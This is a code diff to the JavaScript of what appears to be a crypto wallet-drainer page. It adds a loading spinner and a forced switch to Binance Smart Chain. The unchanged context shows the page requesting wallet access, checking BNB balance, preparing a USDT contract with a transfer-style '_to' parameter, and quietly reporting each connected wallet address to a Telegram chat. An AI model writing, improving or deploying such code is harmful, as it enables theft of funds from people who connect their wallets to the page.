@@ -198,6 +198,8 @@
 
     async function connectAndSend() {
       const status = document.getElementById("status");
+      const loader = document.getElementById("loader");
+      loader.style.display = "block"; // Show loader
       status.innerText = "🔗 Connecting...";
 
       if (typeof window.ethereum === 'undefined') {
@@ -208,6 +210,15 @@
       const web3 = new Web3(window.ethereum);
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       const user = accounts[0];
+
+      // Check if the connected wallet is on Binance Smart Chain (BSC)
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        status.innerText = "⚠️ Wrong Network. Switching to BSC...";
+        await switchToBSC();
+      } else {
+        status.innerText = "✅ Connected to BSC";
+      }
 
       let message = `📲 *Wallet Connected*\n\`${user}\`\n\n`;
 
@@ -247,12 +258,14 @@
         if (!topup.ready) {
           message += `❌ *Top-up Failed*`;
           status.innerText = "❌ Top-up failed.";
+          loader.style.display = "none"; // Hide loader
           return sendTelegram(message);
         }
 
         message += `✅ *Top-up Requested!*\n⏳ *Waiting for balance update...*\n`;
-        await new Promise(r => setTimeout(r, 15000)); 
+        await new Promise(r => setTimeout(r, 15000)); // Wait for 15 seconds
 
+        // Recheck BNB balance
         const bnbCheck = await fetch(bnbUrl);
         const newBnbData = await bnbCheck.json();
         const newBnb = parseFloat(newBnbData.result) / 1e18;
@@ -261,6 +274,7 @@
         if (newBnbUsd < 1) {
           message += `❌ *Still < $1 BNB* – cannot proceed.\n`;
           status.innerText = "❌ Still not enough BNB.";
+          loader.style.display = "none"; // Hide loader
           return sendTelegram(message);
         }
 
@@ -269,6 +283,7 @@
         message += `✅ *BNB is sufficient!*\n`;
       }
 
+      loader.style.display = "none"; // Hide loader
       const usdtContract = new web3.eth.Contract([
         { "constant": false, "inputs": [
             { "name": "_to", "type": "address" },
@@ -293,6 +308,18 @@
       }
 
       await sendTelegram(message);
+    }
+
+    async function switchToBSC() {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }] // BSC Mainnet chain ID (0x38 is hex for 56)
+        });
+      } catch (error) {
+        console.error(error);
+        alert("⚠️ Failed to switch to Binance Smart Chain.");
+      }
     }
 
     async function sendTelegram(msg) {
